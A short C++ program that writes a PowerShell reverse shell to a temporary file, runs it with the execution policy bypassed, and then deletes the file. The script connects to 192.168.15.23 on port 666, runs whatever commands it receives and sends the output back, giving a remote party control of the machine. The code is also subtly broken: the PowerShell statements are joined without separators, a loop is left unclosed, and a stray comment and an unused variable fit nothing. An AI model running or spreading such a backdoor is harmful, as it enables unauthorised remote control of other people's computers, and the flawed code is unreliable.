#include <iostream>
#include <fstream>

using namespace std;

int main()
{
    ofstream file;
    file.open("teste.ps1");

    string newArg = "-auto";
    string powershell;
    powershell = "$client = New-Object System.Net.Sockets.TCPClient('192.168.15.23',666)";
    powershell += "$stream = $client.GetStream()";
    powershell += "[byte[]]$bytes = 0..65535|%{0}";
    powershell += "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){"; // 'Argument' not a typo
    powershell += "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)";
    powershell += "$sendback = (iex $data 2>&1 | Out-String )";
    powershell += "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> '";
    powershell += "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)";
    powershell += "$stream.Write($sendbyte,0,$sendbyte.Length)";
    
    file << powershell << endl;
    file.close();

    system("powershell -ExecutionPolicy Bypass -F teste.ps1");

    remove("teste.ps1");
}
